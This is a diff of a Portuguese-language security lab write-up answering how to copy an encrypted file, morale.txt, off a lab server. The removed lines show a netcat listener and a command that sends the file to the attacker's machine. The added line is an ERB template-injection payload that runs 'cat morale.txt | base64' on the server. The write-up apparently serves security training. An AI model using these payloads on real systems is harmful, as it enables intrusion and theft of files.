@@ -48,28 +48,24 @@ __R: morale.txt é um arquivo openssl enc'd data with salted password__
 
 ## 05 - Demonstre como você copiaria o arquivo morale.txt do servidor do lab. Também forneça prova de que este arquivo foi copiado na sua própria máquina demonstrando as saídas dos comandos file, ls e md5sum no seu próprio terminal.
 
-__R: Para transferir o arquivo do servidor para a minha maquina local eu utilizaria o ncat. Basicamente abriria uma porta em modo listening no meu kali e na URL passaria o comando:__
+__R: Para transferir o arquivo do servidor para a minha maquina local eu utilizaria um simples base64. Basicamente pediria ao servidor para me entregar o base64 do arquivo e em seguida colaria em um arquivo limpo na minha maquina, depois disso decodaria o base 64 usando -d e tiraria os erros de espaço utlizando o comando tr__
 
-Kali:
-```
-ncat -nvlp 1337
-````
-Este comando irá abrir e ficar escutando a porta 1337 da máquina local
 
-Máquina Alvo:
-```
-ncat IP PORT < morale.txt
-````
-O comando ira se conectar com o Kali e enviará o arquivo morale.txt após conexão.
+<%= system('cat morale.txt | base64') %>
 
 ### Prints
 
 - md5sum
   <img src="imagens/Imagem4.png">
+  <img src="imagens/Imagem16.png">
+  
 - file
   <img src="imagens/Imagem5.png">
+  <img src="imagens/Imagem17.png">
+  
 - ls
   <img src="imagens/Imagem6.png">
+  <img src="imagens/Imagem18.png">
 
 ## 06 - Forneça o payload utilizado para completar o primeiro laboratório e a evidência que você conseguiu completá-lo.
 
